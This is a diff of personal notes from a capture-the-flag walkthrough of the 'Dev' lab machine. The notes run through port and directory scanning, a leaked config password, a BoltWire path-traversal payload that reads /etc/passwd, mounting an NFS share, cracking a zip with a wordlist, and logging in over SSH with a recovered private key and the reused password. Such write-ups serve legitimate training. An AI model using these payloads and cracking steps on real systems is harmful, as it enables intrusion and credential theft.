@@ -1,7 +1,7 @@
 Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x84_64 GNU/Linux
 
 Linux DEV
-    nmap -A -T4 -p- 192.168.57.8
+    #nmap -A -T4 -p- 192.168.57.8
         Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 11:27 EDT
         Nmap scan report for 192.168.57.8
         Host is up (0.00061s latency).
@@ -56,18 +56,18 @@ Linux DEV
         Network Distance: 1 hop
         Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-    ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.8/FUZZ
+    #ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.8/FUZZ
 
     http://192.168.57.8/app/config/
         config.yml
             username: bolt
             password: I_love_java
 
-    ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.8:8080/FUZZ
+    #ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.8:8080/FUZZ
 
     http://192.168.57.8:8080/dev/
 
-    searchsploit boltwire
+    #searchsploit boltwire
         ---------------------------------------------------------------------------- ---------------------------------
          Exploit Title                                                              |  Path
         ---------------------------------------------------------------------------- ---------------------------------
@@ -79,53 +79,55 @@ Linux DEV
 
     Pesquisar: boltwire exploit
         (https://www.exploit-db.com/exploits/48411)
-        http://192.168.57.8:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
+       
+       http://192.168.57.8:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
 
         jeanPaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
 
 
-    showmount -e 192.168.57.8
+    #showmount -e 192.168.57.8
         Export list for 192.168.57.8:
         /srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
 
-    mkdir /mnt/dev
+    #mkdir /mnt/dev
 
-    mount -t nfs 192.168.57.8:/srv/nfs /mnt/dev
+    #mount -t nfs 192.168.57.8:/srv/nfs /mnt/dev
 
-    cd /mnt/dev
+    #cd /mnt/dev
 
-    ls
+    #ls
         save.zip
 
-    unzip save.zip
+    #unzip save.zip
         Archive:  save.zip
         [save.zip] id_rsa password:
 
-    apt install fcrackzip
+    #apt install fcrackzip
 
-    fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
+    #fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
         found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
         found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)
 
         PASSWORD FOUND!!!!: pw == java101
 
-    unzip save.zip
+    #unzip save.zip
 
-    cat todo.txt
+    #cat todo.txt
         - Figure out how to install the main website properly, the config file seems correct...
         - Update development website
         - Keep coding in Java because it's awesome
 
         jp
 
-    cat id_rsa
+    #cat id_rsa
         -----BEGIN OPENSSH PRIVATE KEY-----
         b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea
         0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4
         0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj
         3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs
-
-    ssh -i id_rsa jp@192.168.57.8
+        ...
+        
+    #ssh -i id_rsa jp@192.168.57.8
         The authenticity of host '192.168.57.8 (192.168.57.8)' can't be established.
         ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.
         This key is not known by any other names
@@ -133,7 +135,7 @@ Linux DEV
         Warning: Permanently added '192.168.57.8' (ED25519) to the list of known hosts.
         jp@192.168.57.8's password:
 
-    ssh -i id_rsa jeanpaul@192.168.57.8
+    #ssh -i id_rsa jeanpaul@192.168.57.8
         Warning: Identity file id_rsa not accessible: No such file or directory.
         jeanpaul@192.168.57.8's password: 'I_love_java'
 
